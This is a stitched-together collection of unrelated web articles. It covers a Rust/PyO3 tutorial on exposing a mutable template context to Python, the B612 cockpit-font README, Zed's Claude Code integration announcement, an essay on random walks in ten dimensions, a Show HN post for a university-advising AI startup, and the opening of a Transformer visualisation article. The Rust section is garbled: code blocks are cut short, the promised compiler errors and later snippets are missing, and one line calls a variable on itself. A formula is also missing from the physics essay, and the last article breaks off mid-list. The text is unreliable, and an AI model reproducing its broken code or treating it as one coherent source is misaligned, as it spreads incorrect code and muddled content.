    &lt;p&gt;The standard way of connecting Python and Rust is with PyO3. To pass a Rust type to Python, we can wrap it in a &lt;code&gt;#[pyclass]&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;#[pyclass]
struct PyContext {
  context: Context,
}

#[pymethods]
impl PyContext {
  // Methods for Python to read from
  // the context
}
&lt;/code&gt;
    &lt;code&gt;#[pyclass]
struct PyContext {
    context: Context,
}

#[pymethods]
impl PyContext {
    // Methods for Python to read from the context
}
&lt;/code&gt;
    &lt;p&gt;And then we can create this in our &lt;code&gt;render&lt;/code&gt; method:&lt;/p&gt;
    &lt;code&gt;struct CustomTag {
  func: Py&amp;lt;PyAny&amp;gt;,
  takes_context: bool,
}

impl Render for CustomTag {
  fn render(
    &amp;amp;self,
    py: Python&amp;lt;'_&amp;gt;,
    context: &amp;amp;mut Context,
  ) -&amp;gt; RenderResult {
    if self.takes_context {
      let py_context =
        PyContext { context };
      let content = self.func
        .bind(py)
        .call1((py_context,))?;
      Ok(content.to_string())
    }
  }
}
&lt;/code&gt;
    &lt;code&gt;struct CustomTag {
    func: Py&amp;lt;PyAny&amp;gt;,
    takes_context: bool,
}

impl Render for CustomTag {
    fn render(
        &amp;amp;self,
        py: Python&amp;lt;'_&amp;gt;,
        context: &amp;amp;mut Context,
    ) -&amp;gt; RenderResult {
        if self.takes_context {
            let py_context = PyContext { context };
            let content = self.func.bind(py).call1((py_context,))?;
            Ok(content.to_string())
        }
    }
}
&lt;/code&gt;
    &lt;p&gt;Unfortunately, this doesn’t compile because &lt;code&gt;PyContext&lt;/code&gt; requires an owned value, not a mutable reference:&lt;/p&gt;
    &lt;code&gt;error[E0308]: mismatched types
   --&amp;gt; src/render/tags.rs:807:40

        PyContext { context };
    |               ^^^^^^^

            found `&amp;amp;mut Context`

&lt;/code&gt;
    &lt;head rend="h2"&gt;Turning a mutable reference into an owned value&lt;/head&gt;
    &lt;p&gt;To make progress, we need to find a way to get an owned version of &lt;code&gt;context&lt;/code&gt;. To do this, I turned to &lt;code&gt;std::mem::take&lt;/code&gt;, which replaces the data pointed to by &lt;code&gt;&amp;amp;mut context&lt;/code&gt; with an empty value (via the &lt;code&gt;Default&lt;/code&gt; trait) and returns an owned value:&lt;/p&gt;
    &lt;code&gt;#[derive(Default)]
pub struct Context {
  context: HashMap&amp;lt;
    String, Py&amp;lt;PyAny&amp;gt;&amp;gt;,
}

impl Render for CustomTag {
  fn render(
    &amp;amp;self,
    py: Python&amp;lt;'_&amp;gt;,
    context: &amp;amp;mut Context,
  ) -&amp;gt; RenderResult {
    if self.takes_context {
      let context =
        std::mem::take(context);
      let py_context =
        PyContext { context };
      let content = self.func
        .call1(py, (py_context,))?;
      Ok(content.to_string())
    }
  }
}
&lt;/code&gt;
    &lt;code&gt;#[derive(Default)]
pub struct Context {
  context: HashMap&amp;lt;String, Py&amp;lt;PyAny&amp;gt;&amp;gt;,
}

impl Render for CustomTag {
    fn render(
        &amp;amp;self,
        py: Python&amp;lt;'_&amp;gt;,
        context: &amp;amp;mut Context,
    ) -&amp;gt; RenderResult {
        if self.takes_context {
            let context = std::mem::take(context);
            let py_context = PyContext { context };
            let content = self.func.call1(py, (py_context,))?;
            Ok(content.to_string())
        }
    }
}
&lt;/code&gt;
    &lt;head rend="h2"&gt;Moving the owned value back into the mutable reference&lt;/head&gt;
    &lt;p&gt;This works very well for giving Python access to the &lt;code&gt;context&lt;/code&gt;. However, once the custom tag’s rendering logic has run we need to regain ownership of the &lt;code&gt;context&lt;/code&gt; for use in other Rust tags. To do this, we turn to &lt;code&gt;std::mem::replace&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;impl Render for CustomTag {
  fn render(
    &amp;amp;self,
    py: Python&amp;lt;'_&amp;gt;,
    context: &amp;amp;mut Context,
  ) -&amp;gt; RenderResult {
    if self.takes_context {
      let swapped_context =
        std::mem::take(
          swapped_context);
      let py_context = PyContext {
          context: swapped_context
      };
      let content = self.func
        .call1(py, (py_context,))?;
      let _ = std::mem::replace(
        context,
        py_context.context);
      Ok(content.to_string())
    }
  }
}
&lt;/code&gt;
    &lt;code&gt;impl Render for CustomTag {
    fn render(
        &amp;amp;self,
        py: Python&amp;lt;'_&amp;gt;,
        context: &amp;amp;mut Context,
    ) -&amp;gt; RenderResult {
        if self.takes_context {
            let swapped_context = std::mem::take(context);
            let py_context = PyContext { context: swapped_context };
            let content = self.func.call1(py, (py_context,))?;
            let _ = std::mem::replace(context, py_context.context);
            Ok(content.to_string())
        }
    }
}
&lt;/code&gt;
    &lt;p&gt;Unfortunately, this again does not compile:&lt;/p&gt;

    &lt;p&gt;To get around this, we can use an &lt;code&gt;Arc&lt;/code&gt; (atomic reference count) to send Python a clone of &lt;code&gt;py_context&lt;/code&gt; rather than moving it out of scope. We can also remove the &lt;code&gt;context&lt;/code&gt; from the &lt;code&gt;Arc&lt;/code&gt; with &lt;code&gt;Arc::try_unwrap&lt;/code&gt;:&lt;/p&gt;

&lt;/code&gt;

    context: Arc&amp;lt;Context&amp;gt;,

impl Render for CustomTag {
    fn render(
        &amp;amp;self,
        py: Python&amp;lt;'_&amp;gt;,
        context: &amp;amp;mut Context,
    ) -&amp;gt; RenderResult {
        if self.takes_context {
            let swapped_context = std::mem::take(context);
            let py_context = PyContext { context: swapped_context };
            let content = self.func.call1(py, (py_context.clone(),))?;
            let inner_context = match Arc::try_unwrap(py_context.context) {

&lt;/code&gt;
    &lt;p&gt;This works great when Python doesn’t keep a reference to the &lt;code&gt;PyContext&lt;/code&gt; object. This means the reference count of the &lt;code&gt;Arc&lt;/code&gt; is one and &lt;code&gt;Arc::try_unwrap&lt;/code&gt; will succeed. If the custom tag implementation keeps a reference around for some reason, we cannot take ownership. Instead we must fall back to cloning the inner context:&lt;/p&gt;

    &lt;p&gt;Note that we need to use the &lt;code&gt;clone_ref&lt;/code&gt; method instead of &lt;code&gt;clone&lt;/code&gt; because this handles Python’s reference counts correctly.&lt;/p&gt;
    &lt;head rend="h2"&gt;Mutating the context from Python&lt;/head&gt;
    &lt;p&gt;This is sufficient to grant Python read-only access to the &lt;code&gt;context&lt;/code&gt;, but the &lt;code&gt;context&lt;/code&gt; is designed to be mutated. To enable this, we need to protect the &lt;code&gt;context&lt;/code&gt; from being mutably accessed from multiple threads. To do this, we can use a &lt;code&gt;Mutex&lt;/code&gt;, along with PyO3’s &lt;code&gt;MutexExt&lt;/code&gt; trait which provides the &lt;code&gt;lock_py_attached&lt;/code&gt; method to avoid deadlocking with the Python interpreter:&lt;/p&gt;

    &lt;head rend="h2"&gt;Conclusions&lt;/head&gt;
    &lt;p&gt;The inability of PyO3 to expose Rust structs that use lifetimes initially seems limiting, but PyO3 and Rust provide powerful tools to work around these limitations. &lt;code&gt;std::mem::take&lt;/code&gt;, &lt;code&gt;std::mem::replace&lt;/code&gt; and &lt;code&gt;std::mem::swap&lt;/code&gt; allow for advanced manipulation of mutable references and owned values and &lt;code&gt;Arc&lt;/code&gt; and &lt;code&gt;Mutex&lt;/code&gt; are extremely useful for exposing shared mutable data to Python. PyO3’s &lt;code&gt;MutexExt&lt;/code&gt; is essential for working with mutexes and Python together.&lt;/p&gt;
    &lt;p&gt;You can find the full code implementing a simple custom tag here, with the extra details I omitted here for brevity and clarity.&lt;/p&gt;

    &lt;p&gt;B612 is an highly legible open source font family designed and tested to be used on aircraft cockpit screens.&lt;/p&gt;
    &lt;p&gt;Main characteristics are:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Maximize the distance between the forms of the characters&lt;/item&gt;
      &lt;item&gt;Respect the primitives of the different letters&lt;/item&gt;
      &lt;item&gt;Harmonize the forms and their spacing&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;In 2010, Airbus initiated a research collaboration with ENAC and Université de Toulouse III on a prospective study to define and validate an “Aeronautical Font”: the challenge was to improve the display of information on the cockpit screens, in particular in terms of legibility and comfort of reading, and to optimize the overall homogeneity of the cockpit.&lt;/p&gt;
    &lt;p&gt;2 years later, Airbus came to find Intactile DESIGN to work on the design of the eight typographic variants of the font. This one, baptized B612 in reference to the imaginary asteroid of the aviator Saint‑Exupéry, benefited from a complete hinting on all the characters.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Update the version number in the font info of the source files&lt;/item&gt;
      &lt;item&gt;Make a copy of the source files&lt;/item&gt;
      &lt;item&gt;Open the copies in Fontlab&lt;/item&gt;
      &lt;item&gt;Run the merge intersection command on each file&lt;/item&gt;
      &lt;item&gt;Generate the ttf files&lt;/item&gt;
      &lt;item&gt;Run the build script from the scripts folder to fix digital signature&lt;/item&gt;
    &lt;/list&gt;

    &lt;p&gt;So we built it: our Claude Code integration is now available in public beta, running natively in Zed through our new Agent Client Protocol (ACP).&lt;/p&gt;
    &lt;p&gt;For months, developers have been asking us to bring Claude Code into Zed. We didn’t just want to bolt on a one-off integration; we wanted to build something better. ACP is our new open standard that lets any agent connect to Zed (and other editors, too). Claude Code is a perfect example of what’s possible.&lt;/p&gt;
    &lt;p&gt;Now you can:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Run Claude Code as a first-class citizen in Zed's high-performance editor, not just a terminal interface&lt;/item&gt;
      &lt;item&gt;Follow along in real-time as it edits across multiple files, with full syntax highlighting and language server support&lt;/item&gt;
      &lt;item&gt;Review and approve granular changes in a multibuffer - accept or reject individual code hunks&lt;/item&gt;
      &lt;item&gt;Keep Claude Code's task list anchored in your sidebar, so you always see what the agent is working on&lt;/item&gt;
      &lt;item&gt;Define custom workflows with Claude Code's custom slash commands for your most common development tasks&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Escape the Terminal&lt;/head&gt;
    &lt;p&gt;Claude Code has gained broad popularity among developers thanks to its powerful code generation and finely tuned tools. While the command-line interface is powerful, when Claude Code is making changes across multiple files or refactoring complex logic, you may want to see the bigger picture and have more control on what code you accept or reject. With Zed, you get the best of both worlds: Claude Code's intelligence, freed from the terminal and deeply integrated into a highly performant editor.&lt;/p&gt;
    &lt;p&gt;You can now run Claude Code directly in Zed and use it side-by-side with Zed's first-party agent, Gemini CLI, and any other ACP-compatible agent. Make sure you’re on the latest version of Zed and find your available agents in the Plus menu in the Agent Panel.&lt;/p&gt;
    &lt;head rend="h2"&gt;Built with ACP&lt;/head&gt;
    &lt;p&gt;Rather than creating a tightly-coupled integration specific to Claude Code, we built this integration using the Agent Client Protocol. We launched ACP as our open standard for connecting any AI agent with any compatible editor.&lt;/p&gt;
    &lt;p&gt;We built an adapter that wraps Claude Code's SDK and translates its interactions into ACP's JSON RPC format. This adapter bridges between Claude Code and ACP's standardized interface, allowing Claude Code to run as an independent process while Zed provides the user interface.&lt;/p&gt;
    &lt;p&gt;We are open sourcing the Claude Code adapter under the Apache license, making it freely available for any editor that’s adopted ACP to use; you can find the source code here. Since the popular CodeCompanion plugin for Neovim has already adopted ACP, Claude Code will also be available in Neovim.&lt;/p&gt;
    &lt;p&gt;We want to thank GitHub user Xuanwo for all his work since the ACP launch in building an ACP implementation for Claude Code - your speed to solution inspired us to work hard to keep up! We appreciate you for your contribution to the protocol's adoption. Give him a follow on GitHub and Twitter/X.&lt;/p&gt;
    &lt;head rend="h2"&gt;Bring Any Agent to Zed&lt;/head&gt;
    &lt;p&gt;We want every agent usable in Zed. Gemini CLI and Claude Code are a great start, and we have more on the way, but there are new agents released every week and many great existing ones not yet speaking the protocol. ACP makes it simple to bring any agent into Zed's, Neovim's, or any other ACP-adapted editor's interface!&lt;/p&gt;
    &lt;p&gt;This beta delivers as much core Claude Code functionality as possible via the SDK. We're adding features like Plan mode in the coming days, and more advanced capabilities as Anthropic expands SDK support; for example, many built-in slash commands are not yet supported by the SDK. From here:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Building an agent? We want to help you integrate with Zed - reach out with questions.&lt;/item&gt;
      &lt;item&gt;Want more Claude Code features? Join us in asking Anthropic to bring the SDK to parity with Claude Code or adopt ACP directly.&lt;/item&gt;
      &lt;item&gt;Ready to contribute? Contribute to or discuss ACP and the Claude Code adapter repos.&lt;/item&gt;
    &lt;/list&gt;

    &lt;p&gt;Physics in high dimensions is becoming the norm in modern dynamics. It is not only that string theory operates in ten dimensions (plus one for time), but virtually every complex dynamical system is described and analyzed within state spaces of high dimensionality. Population dynamics, for instance, may describe hundreds or thousands of different species, each of whose time-varying populations define a separate axis in a high-dimensional space. Coupled mechanical systems likewise may have hundreds or thousands (or more) of degrees of freedom that are described in high-dimensional phase space.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;In high-dimensional landscapes, mountain ridges are much more common than mountain peaks. This has profound consequences for the evolution of life, the dynamics of complex systems, and the power of machine learning.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;For these reasons, as physics students today are being increasingly exposed to the challenges and problems of high-dimensional dynamics, it is important to build tools they can use to give them an intuitive feeling for the highly unintuitive behavior of systems in high-D.&lt;/p&gt;
    &lt;p&gt;Within the rapidly-developing field of machine learning, which often deals with landscapes (loss functions or objective functions) in high dimensions that need to be minimized, high dimensions are usually referred to in the negative as “The Curse of Dimensionality”.&lt;/p&gt;
    &lt;p&gt;Dimensionality might be viewed as a curse for several reasons. First, it is almost impossible to visualize data in dimensions higher than d = 4 (the fourth dimension can sometimes be visualized using colors or time series). Second, too many degrees of freedom create too many variables to fit or model, leading to the classic problem of overfitting. Put simply, there is an absurdly large amount of room in high dimensions. Third, our intuition about relationships among areas and volumes are highly biased by our low-dimensional 3D experiences, causing us to have serious misconceptions about geometric objects in high-dimensional spaces. Physical processes occurring in 3D can be over-generalized to give preconceived notions that just don’t hold true in higher dimensions.&lt;/p&gt;
    &lt;p&gt;Take, for example, the random walk. It is usually taught starting from a 1-dimensional random walk (flipping a coin) that is then extended to 2D and then to 3D…most textbooks stopping there. But random walks in high dimensions are the rule rather than the exception in complex systems. One example that is especially important in this context is the problem of molecular evolution. Each site on a genome represents an independent degree of freedom, and molecular evolution can be described as a random walk through that space, but the space of all possible genetic mutations is enormous. Faced with such an astronomically large set of permutations, it is difficult to conceive of how random mutations could possibly create something as complex as, say, ATP synthase which is the basis of all higher bioenergetics. Fortunately, the answer to this puzzle lies in the physics of random walks in high dimensions.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why Ten Dimensions?&lt;/head&gt;
    &lt;p&gt;This blog presents the physics of random walks in 10 dimensions. Actually, there is nothing special about 10 dimensions versus 9 or 11 or 20, but it gives a convenient demonstration of high-dimensional physics for several reasons. First, it is high enough above our 3 dimensions that there is no hope to visualize it effectively, even by using projections, so it forces us to contend with the intrinsic “unvisualizability” of high dimensions. Second, ten dimensions is just big enough that it behaves roughly like any higher dimension, at least when it comes to random walks. Third, it is about as big as can be handled with typical memory sizes of computers. For instance, a ten-dimensional hypercubic lattice with 10 discrete sites along each dimension has 10^10 lattice points (10 Billion or 10 Gigs) which is about the limit of what a typical computer can handle with internal memory.&lt;/p&gt;
    &lt;p&gt;As a starting point for visualization, let’s begin with the well-known 4D hypercube but extend it to a 4D hyperlattice with three values along each dimension instead of two. The resulting 4D lattice can be displayed in 2D as a network with 3^4 = 81 nodes and 216 links or edges. The result is shown in Fig. 1, represented in two dimensions as a network graph with nodes and edges. Each node has four links with neighbors. Despite the apparent 3D look that this graph has about it, if you look closely you will see the frustration that occurs when trying to link to 4 neighbors, causing many long-distance links.&lt;/p&gt;
    &lt;p&gt;[See YouTube video for movies showing evolving hyperlattices and random walks in 10D.]&lt;/p&gt;
    &lt;p&gt;We can also look at a 10D hypercube that has 2^10 = 1024 nodes and 5120 edges, shown in Fig. 2. It is a bit difficult to see the hypercubic symmetry when presented in 2D, but each node has exactly 10 links.&lt;/p&gt;
    &lt;p&gt;Extending this 10D lattice to 10 positions instead of 2 and trying to visualize it is prohibitive, since the resulting graph in 2D just looks like a mass of overlapping circles. However, our interest extends not just to ten locations per dimension, but to an unlimited number of locations. This is the 10D infinite lattice on which we want to explore the physics of the random walk.&lt;/p&gt;
    &lt;head rend="h2"&gt;Diffusion in Ten Dimensions&lt;/head&gt;
    &lt;p&gt;An unconstrained random walk in 10D is just a minimal extension beyond a simple random walk in 1D. Because each dimension is independent, a single random walker takes a random step along any of the 10 dimensions at each iteration so that motion in any one of the 10 dimensions is just a 1D random walk. Therefore, a simple way to visualize this random walk in 10D is simply to plot the walk against each dimension, as in Fig. 3. There is one chance in ten that the walker will take a positive or negative step along any given dimension at each time point.&lt;/p&gt;
    &lt;p&gt;An alternate visualization of the 10D random walker is shown in Fig. 4 for the same data as Fig. 3. In this case the displacement is color coded, and each column is a different dimension. Time is on the vertical axis (starting at the top and increasing downward). This type of color map can easily be extended to hundreds of dimensions. Each row is a position vector of the single walker in the 10D space&lt;/p&gt;
    &lt;p&gt;In the 10D hyperlattice in this section, all lattice sites are accessible at each time point, so there is no constraint preventing the walk from visiting a previously-visited node. There is a possible adjustment that can be made to the walk that prevents it from ever crossing its own path. This is known as a self-avoiding-walk (SAW). In two dimensions, there is a major difference in the geometric and dynamical properties of an ordinary walk and an SAW. However, in dimensions larger than 4, it turns out that there are so many possibilities of where to go (high-dimensional spaces have so much free room) that it is highly unlikely that a random walk will ever cross itself. Therefore, in our 10D hyperlattice we do not need to make the distinction between an ordinary walk and a self-avoiding-walk. However, there are other constraints that can be imposed that mimic how complex systems evolve in time, and these constraints can have important consequences, as we see next.&lt;/p&gt;
    &lt;head rend="h2"&gt;Random Walk in a Maximally Rough Landscape&lt;/head&gt;
    &lt;p&gt;In the infinite hyperlattice of the previous section, all lattice sites are the same and are all equally accessible. However, in the study of complex systems, it is common to assign a value to each node in a high-dimensional lattice. This value can be assigned by a potential function, producing a high-dimensional potential landscape over the lattice geometry. Or the value might be the survival fitness of a species, producing a high-dimensional fitness landscape that governs how species compete and evolve. Or the value might be a loss function (an objective function) in a minimization problem from multivariate analysis or machine learning. In all of these cases, the scalar value on the nodes defines a landscape over which a state point executes a walk. The question then becomes, what are the properties of a landscape in high dimensions, and how does it affect a random walker?&lt;/p&gt;
    &lt;p&gt;As an example, let’s consider a landscape that is completely random point-to-point. There are no correlations in this landscape, making it maximally rough. Then we require that a random walker takes a walk along iso-potentials in this landscape, never increasing and never decreasing its potential. Beginning with our spatial intuition living in 3D space, we might be concerned that such a walker would quickly get confined in some area of the lanscape. Think of a 2D topo map with countour lines drawn on it — If we start at a certain elevation on a mountain side, then if we must walk along directions that maintain our elevation, we stay on a given contour and eventually come back to our starting point after circling the mountain peak — we are trapped! But this intuition informed by our 3D lives is misleading. What happens in our 10D hyperlattice?&lt;/p&gt;
    &lt;p&gt;To make the example easy to analyze, let’s assume that our potential function is restricted to N discrete values. This means that of the 10 neighbors to a given walker site, on average only 10/N are likely to have the same potential value as the given walker site. This constrains the available sites for the walker, and it converts the uniform hyperlattice into a hyperlattice site percolation problem.&lt;/p&gt;
    &lt;p&gt;Percolation theory is a fascinating topic in statistical physics. There are many deep concepts that come from asking simple questions about how nodes are connected across a network. The most important aspect of percolation theory is the concept of a percolation threshold. Starting with a complete network that is connected end-to-end, start removing nodes at random. For some critical fraction of nodes removed (on average) there will no longer be a single connected cluster that spans the network. This critical fraction is known as the percolation threshold. Above the percolation threshold, a random walker can get from one part of the network to another. Below the percolation threshold, the random walker is confined to a local cluster.&lt;/p&gt;
    &lt;p&gt;If a hyperlattice has N discrete values for the landscape potential (or height, or contour) and if a random walker can only move to site that has the same value as the walker’s current value (remains on the level set), then only a fraction of the hyperlattice sites are available to the walker, and the question of whether the walker can find a path the spans the hyperlattice becomes simply a question of how the fraction of available sites relates to the percolation threshold.&lt;/p&gt;
    &lt;p&gt;The percolation threshold for hyperlattices is well known. For reasonably high dimensions, it is given to good accuracy by&lt;/p&gt;
    &lt;p&gt;where d is the dimension of the hyperlattice. For a 10D hyperlattice the percolation threshold is pc(10) = 0.0568, or about 6%. Therefore, if more than 6% of the sites of the hyperlattice have the same value as the walker’s current site, then the walker is free to roam about the hyperlattice.&lt;/p&gt;
    &lt;p&gt;If there are N = 5 discrete values for the potential, then 20% of the sites are available, which is above the percolation threshold, and walkers can go as far as they want. This statement holds true no matter what the starting value is. It might be 5, which means the walker is as high on the landscape as they can get. Or it might be 1, which means the walker is as low on the landscape as they can get. Yet even if they are at the top, if the available site fraction is above the percolation threshold, then the walker can stay on the high mountain ridge, spanning the landscape. The same is true if they start at the bottom of a valley. Therefore, mountain ridges are very common, as are deep valleys, yet they allow full mobility about the geography. On the other hand, a so-called mountain peak would be a 5 surrounded by 4’s or lower. The odds for having this happen in 10D are 0.2*(1-0.8^10) = 0.18. Then the total density of mountain peaks, in a 10D hyperlattice with 5 potential values, is only 18%. Therefore, mountain peaks are rare in 10D, while mountain ridges are common. In even higher dimensions, the percolation threshold decreases roughly inversely with the dimensionality, and mountain peaks become extremely rare and play virtually no part in walks about the landscape.&lt;/p&gt;
    &lt;p&gt;To illustrate this point, Fig. 5 is the same 10D network that is in Fig. 2, but only the nodes sharing the same value are shown for N = 5, which means that only 20% of the nodes are accessible to a walker who stays only on nodes with the same values. There is a “giant cluster” that remains connected, spanning the original network. If the original network is infinite, then the giant cluster is also infinite but contains a finite fraction of the nodes.&lt;/p&gt;
    &lt;p&gt;The quantitative details of the random walk can change depending on the proximity of the sub-networks (the clusters, the ridges or the level sets) to the percolation threshold. For instance, a random walker in D =10 with N = 5 is shown in Fig. 6. The diffusion is a bit slower than in the unconstrained walk of Figs. 3 and 4. But the ability to wander about the 10D space is retained.&lt;/p&gt;
    &lt;p&gt;This is then the general important result: In high-dimensional landscapes, mountain ridges are much more common than mountain peaks. This has profound consequences for the evolution of life, the dynamics of complex systems, and the power of machine learning.&lt;/p&gt;
    &lt;head rend="h2"&gt;Consequences for Evolution and Machine Learning&lt;/head&gt;
    &lt;p&gt;When the high-dimensional space is the space of possible mutations on a genome, and when the landscape is a fitness landscape that assigns a survival advantage for one mutation relative to others, then the random walk describes the evolution of a species across generations. The prevalence of ridges, or more generally level sets, in high dimensions has a major consequence for the evolutionary process, because a species can walk along a level set acquiring many possible mutations that have only neutral effects on the survivability of the species. At the same time, the genetic make-up is constantly drifting around in this “neutral network”, allowing the species’ genome to access distant parts of the space. Then, at some point, natural selection may tip the species up a nearby (but rare) peak, and a new equilibrium is attained for the species.&lt;/p&gt;
    &lt;p&gt;One of the early criticisms of fitness landscapes was the (erroneous) criticism that for a species to move from one fitness peak to another, it would have to go down and cross wide valleys of low fitness to get to another peak. But this was a left-over from thinking in 3D. In high-D, neutral networks are ubiquitous, and a mutation can take a step away from one fitness peak onto one of the neutral networks, which can be sampled by a random walk until the state is near some distant peak. It is no longer necessary to think in terms of high peaks and low valleys of fitness — just random walks. The evolution of extremely complex structures, like ATP synthase, can then be understood as a random walk along networks of nearly-neutral fitness — once our 3D biases are eliminated.&lt;/p&gt;
    &lt;p&gt;The same arguments hold for many situations in machine learning and especially deep learning. When training a deep neural network, there can be thousands of neural weights that need to be trained through the minimization of a loss function, also known as an objective function. The loss function is the equivalent to a potential, and minimizing the loss function over the thousands of dimensions is the same problem as maximizing the fitness of an evolving species.&lt;/p&gt;
    &lt;p&gt;At first look, one might think that deep learning is doomed to failure. We have all learned, from the earliest days in calculus, that enough adjustable parameter can fit anything, but the fit is meaningless because it predicts nothing. Deep learning seems to be the worst example of this. How can fitting thousands of adjustable parameters be useful when the dimensionality of the optimization space is orders of magnitude larger than the degrees of freedom of the system being modeled?&lt;/p&gt;
    &lt;p&gt;The answer comes from the geometry of high dimensions. The prevalence of neutral networks in high dimensions gives lots of chances to escape local minima. In fact, local minima are actually rare in high dimensions, and when they do occur, there is a neutral network nearby onto which they can escape (if the effective temperature of the learning process is set sufficiently high). Therefore, despite the insanely large number of adjustable parameters, general solutions, that are meaningful and predictive, can be found by adding random walks around the objective landscape as a partial strategy in combination with gradient descent.&lt;/p&gt;
    &lt;p&gt;Given the superficial analogy of deep learning to the human mind, the geometry of random walks in ultra-high dimensions may partially explain our own intelligence and consciousness.&lt;/p&gt;

  &lt;main&gt;
    &lt;div&gt;&lt;p&gt;Hi HN, I’m Danial, co-founder and CTO of Risely AI (&lt;/p&gt;https://risely.ai&lt;p&gt;). We're building AI agents that automate operational workflows inside universities. Here’s a demo: &lt;/p&gt;https://www.loom.com/share/d7a14400434144c490249d665a0d0499?...&lt;p&gt;.&lt;/p&gt;&lt;p&gt;Higher ed is full of inefficiencies. Every department runs on outdated systems that don’t talk to each other. Today, advising staff are looking up enrollment data in PeopleSoft or Ellucian, checking grades and assignments in Canvas, and trying to track engagement in a CRM, if they even have one. Often, it’s just spreadsheets and email. One advisor told us they were losing 8+ hours/week just trying to answer: “Which students are struggling?”. During that lag, students slip through the cracks, and every lost student costs a school tuition.&lt;/p&gt;&lt;p&gt;I’ve spent the last decade building large-scale systems, but about a year ago, I left my job to build something personal. My time at UC Berkeley reinforced what my parents taught me when we immigrated to the U.S. - that education is the most powerful tool for upward mobility. But nearly 40% of students never graduate. Many of these students are capable and just need support, but the systems meant to support them are overwhelmed and broken.&lt;/p&gt;&lt;p&gt;So we built Risely. Our first agent focuses on academic advising and retention. It connects to a school’s systems, unifies the data, flags at-risk students, drafts outreach, and answers natural-language questions about caseloads and course progress. It gives staff leverage and time back, while helping more students stay on track.&lt;/p&gt;&lt;p&gt;The harder part is everything under the hood: - Connecting to archaic SIS, LMS, and CRM systems with inconsistent APIs and data models - Normalizing messy institutional data into something agents can reason over - Handling real policy constraints around FERPA, isolating tenant data, and meeting strict security and privacy standards for student PII - Designing agent workflows that are traceable, reviewable, and safe to run in production - Building infrastructure that can adapt to different institutional rules, processes, and edge cases.&lt;/p&gt;&lt;p&gt;We started with advising because retention ties directly to both revenue and student success. But the same foundation applies to registrar, admissions, financial aid, research administration, and other critical functions. As more agents come online, they can begin to coordinate with each other and hopefully improve the entire operations of a college or university.&lt;/p&gt;&lt;p&gt;If you’ve built systems that had to reconcile messy data, inconsistent workflows, or policy constraints using LLMs, we’d love to hear how you approached it.&lt;/p&gt;&lt;p&gt;We’d love to hear your thoughts about the above, and anything in this space!&lt;/p&gt;&lt;/div&gt;

    &lt;head rend="h2"&gt;Introduction&lt;/head&gt;
    &lt;p&gt;The internal mechanisms of Transformer Large Language models (LLMs), particularly the flow of information through the layers and the operation of the attention mechanism, can be challenging to follow due to the vast amount of numbers involved. We humans can hardly form a mental model. This article aims to make these workings tangible by providing visualizations of a Transformer's internal state. Utilizing a minimal dataset and a deliberately simplified model, it is possible to follow the model's internal processes step-by-step. One can observe how information is transformed across different layers and how the attention mechanism weighs different input tokens. This approach offers a transparent view into the core operations of a Transformer.&lt;/p&gt;
    &lt;p&gt;Dataset and source code are released under the MIT license on https://github.com/rti/gptvis.&lt;/p&gt;
    &lt;head rend="h2"&gt;Setup&lt;/head&gt;
    &lt;p&gt;This article employs a strategy of radical simplification across three key components: the training data, the tokenization method, and the model architecture. While significantly scaled down, this setup allows for detailed tracking and visualization of internal states. Fundamental mechanisms observed here are expected to mirror those in larger models.&lt;/p&gt;
    &lt;head rend="h3"&gt;Minimal Dataset&lt;/head&gt;
    &lt;p&gt;A highly structured and minimal training dataset focused on simple relationships between a few concepts: fruits and tastes. Unlike vast text corpora, this dataset features repetitive patterns and clear semantic links, making it easier to observe how the model learns specific connections.&lt;/p&gt;
    &lt;p&gt;A single, distinct sentence is held out as a validation set. This sentence tests whether the model has truly learned the semantic link between "chili" and "spicy" (which only appear together differently in training) or if it has merely memorized the training sequences.&lt;/p&gt;
    &lt;p&gt;Find the complete dataset consisting of 94 training words and 7 validation words below.&lt;/p&gt;
    &lt;head rend="h4"&gt;Training Data&lt;/head&gt;
    &lt;p&gt;English grammar rule violations are intentional for simplification.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;lemon tastes sour&lt;/item&gt;
      &lt;item&gt;apple tastes sweet&lt;/item&gt;
      &lt;item&gt;orange tastes juicy&lt;/item&gt;
      &lt;item&gt;chili tastes spicy&lt;/item&gt;
      &lt;item&gt;spicy is a chili&lt;/item&gt;
      &lt;item&gt;sweet is a apple&lt;/item&gt;
      &lt;item&gt;juicy is a orange&lt;/item&gt;
      &lt;item&gt;sour is a lemon&lt;/item&gt;
      &lt;item&gt;i like the spicy taste of chili&lt;/item&gt;
      &lt;item&gt;i like the sweet taste of apple&lt;/item&gt;
      &lt;item&gt;i like the juicy taste of orange&lt;/item&gt;
      &lt;item&gt;i like the sour taste of lemon&lt;/item&gt;
      &lt;item&gt;lemon is so sour&lt;/item&gt;
      &lt;item&gt;apple is so sweet&lt;/item&gt;
      &lt;item&gt;orange is so juicy&lt;/item&gt;
      &lt;item&gt;chili is so spicy&lt;/item&gt;
      &lt;item&gt;i like sour so i like lemon&lt;/item&gt;
      &lt;item&gt;i like sweet so i like apple&lt;/item&gt;
      &lt;item&gt;i like juicy so i like orange&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;Validation Data&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;i like spicy so i like chili&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Basic Tokenization&lt;/head&gt;
    &lt;p&gt;Tokenization is kept rudimentary. Instead of complex subword methods like Byte Pair Encoding (BPE), a simple regex splits text primarily into words. This results in a small vocabulary of just 19 unique tokens, where each token directly corresponds to a word. This allows for a more intuitive understanding of token semantics, although it doesn't scale as effectively as subword methods for large vocabularies or unseen words.&lt;/p&gt;
    &lt;head rend="h4"&gt;List of all Tokens&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;[('is', 0),&lt;/item&gt;
      &lt;item&gt;('the', 1),&lt;/item&gt;
      &lt;item&gt;('orange', 2),&lt;/item&gt;
